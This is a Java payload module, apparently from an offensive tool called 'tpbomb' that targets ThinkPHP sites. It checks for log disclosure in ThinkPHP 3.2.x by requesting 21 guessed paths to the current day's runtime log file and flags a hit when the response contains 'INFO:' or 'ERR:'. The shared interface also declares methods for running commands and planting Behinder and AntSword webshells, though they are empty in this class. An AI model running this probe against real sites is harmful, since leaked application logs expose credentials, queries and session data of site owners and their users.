package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;
import java.util.ArrayList;
import java.util.Date;

public class TP3LogLeak implements PayloadTemplate {
    Date date = new Date();
    String year = String.format("%tY", date);
    String month = String.format("%tm", date);
    String day = String.format("%td", date);
    String logFileName = year.substring(2,4) + "_" + month + "_" + day + ".log";
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("Runtime/Logs/" + logFileName);
        add("Runtime/Logs/Api/" + logFileName);
        add("Runtime/Logs/App/" + logFileName);
        add("Runtime/Logs/Home/" + logFileName);
        add("Runtime/Logs/Admin/" + logFileName);
        add("Runtime/Logs/Common/" + logFileName);
        add("Runtime/Logs/Service/" + logFileName);
        add("App/Runtime/Logs/" + logFileName);
        add("App/Runtime/Logs/Api/" + logFileName);
        add("App/Runtime/Logs/App/" + logFileName);
        add("App/Runtime/Logs/Home/" + logFileName);
        add("App/Runtime/Logs/Admin/" + logFileName);
        add("App/Runtime/Logs/Common/" + logFileName);
        add("App/Runtime/Logs/Service/" + logFileName);
        add("Application/Runtime/Logs/" + logFileName);
        add("Application/Runtime/Logs/Api/" + logFileName);
        add("Application/Runtime/Logs/App/" + logFileName);
        add("Application/Runtime/Logs/Home/" + logFileName);
        add("Application/Runtime/Logs/Admin/" + logFileName);
        add("Application/Runtime/Logs/Common/" + logFileName);
        add("Application/Runtime/Logs/Service/" + logFileName);
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (String payload : payloadList) {
                String result = UrlUtils.doGet(url + payload);
                if (result == null) {
                    continue;
                }
                if (result.contains("INFO:") || result.contains("ERR:")) {
                    return new ResultUtils(true, "ThinkPHP3.2.x 日志泄露", url + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP3.2.x 日志泄露", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        return null;
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        return null;
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        return null;
    }

}
